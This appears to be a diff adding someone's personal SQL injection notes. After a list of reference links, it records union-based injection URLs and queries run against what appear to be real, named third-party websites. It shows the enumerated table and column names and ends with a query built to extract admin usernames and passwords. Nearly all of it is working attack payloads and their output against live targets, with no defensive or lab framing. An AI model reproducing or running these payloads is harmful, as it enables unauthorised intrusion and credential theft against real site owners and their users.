@@ -1,0 +1,118 @@
+http://www.unixwiz.net/techtips/sql-injection.html
+
+https://www.owasp.org/index.php/SQL_Injection
+
+http://www.slideshare.net/helloanand/sql-injection-13537064
+
+http://php.net/manual/en/security.database.sql-injection.php
+
+http://www.veracode.com/security/sql-injection
+
+https://www.acunetix.com/websitesecurity/sql-injection/
+
+http://vi.wikipedia.org/wiki/SQL_injection
+
+http://stackoverflow.com/questions/8512584/zend-framework-sql-injection-protection
+
+https://www.facebook.com/cehvn/posts/465184530172489
+
+http://sinhvienit.net/forum/huong-dan-hack-database-qua-sql-injection.11435.html
+
+
+http://www.raahauges.com/view-news.php?id=8%20order%20by%205
+
+http://www.raahauges.com/view-news.php?id=null%20union%20all%20select%201,2,group_concat(table_name),4,5%20from%20information_schema.tables%20where%20table_schema=database()--
+
+events,media,news,pages,results
+
+http://www.raahauges.com/view-news.php?id=8%20union%20all%20select%201,2,group_concat(column_name),4,5%20from%20information_schema.columns%20where%20table_schema==database()--
+
+id,date,time,title,details,id,title,filename,id,date,title,details,homepage,id,name,text,id,date,title,details
+
+https://www.youtube.com/watch?v=Uu04Shwqlfo
+
+http://www.cobranet.org/about.php?id=1%27
+
+1. order by "number" --
+=> number 6
+2. id=null union all select 1,2,3,4,5,6 --
+=> result 4
+3. id=null union all select 1,2,3,@@Version,5,6 --
+=> version 5.0.95
+4. id=null union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()--
+=>
+	1. 3d_images,
+	2. about,
+	3. apllied_items,
+	4. banners,
+	5. banners_items,
+	6. careers,
+	7. contactus,
+	8. coverage_map,
+	9. d_images,
+	10. extra,
+	11. extra_ugo,
+	12. faq,
+	13. fliers_data,
+	14. getugo,
+	15. harmattan,
+	16. headlines,
+	17. map,
+	18. news,
+	19. news_images,
+	20. offer,
+	21. pos,
+	22. pos_images,
+	23. q_items,
+	24. questions,
+	25. sent_mails,
+	26. site_admins,
+	27. steps,
+	28. steps2,
+	29. support,
+	30. support_address,
+	31. ugo,
+	32. ugo_items,
+	33. ugo_pdf,
+	34. ugo_plans,
+	35. urls
+5. id=null union all select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=database()--
+	1. id,img,section,pos,blackwhite,
+	2. id,text,section,title,isdefault,pos,
+	3. id,pageid,menuid,
+	4. id,title,img,link,pos,type,
+	5. id,text,section,pos,
+	6. id,isdefault,title,text,pos,jobposition,
+	7. id,title,text,isdefault,pos,
+	8. id,title,text,pos,
+	9. id,img,parent,
+	10. id,text,
+	11. id,title,text,pos,type,section,
+	12. id,problem,reason,solution,section,pos,promo,ip,datetime,fi,
+	13. id,title,simg,img,status,pos,view3d,
+	14. id,status,
+	15. id,text,
+	16. id,img,himg,
+	17. id,title,shorttext,text,date,pos,
+	18. id,img,section,pos,video,
+	19. id,status,
+	20. id,title,text,pos,
+	21. id,img,section,pos,
+	22. id,a,x,section,
+	23. id,title,question,itm,link,pos,section,
+	24. index,FirstName,LastName,Email,Phone,Address,To,DateTime,Concerns,Concern_Type,
+	25. admin_id,admin_username,admin_password,
+	26. id,title,section,pos,
+	27. id,img,text,section,pos,
+	28. id,title,text,isdefault,pos,
+	29. id,title,text,section,pos,
+	30. id,title,text,isdefault,pos,section,
+	31. id,title,text,section,pos,type,
+	32. id,title,filepdf,section,pos,
+	33. id,plan,offer,speed,price_month,allowance,section,pos,
+	34. id,url,section,pos
+=> admin_username,admin_password
+
+id=null union all select 1,2,3,group_concat(admin_username,0x3a,admin_password) ,5,6 from site_admins-- 
+
+http://www.raahauges.com/
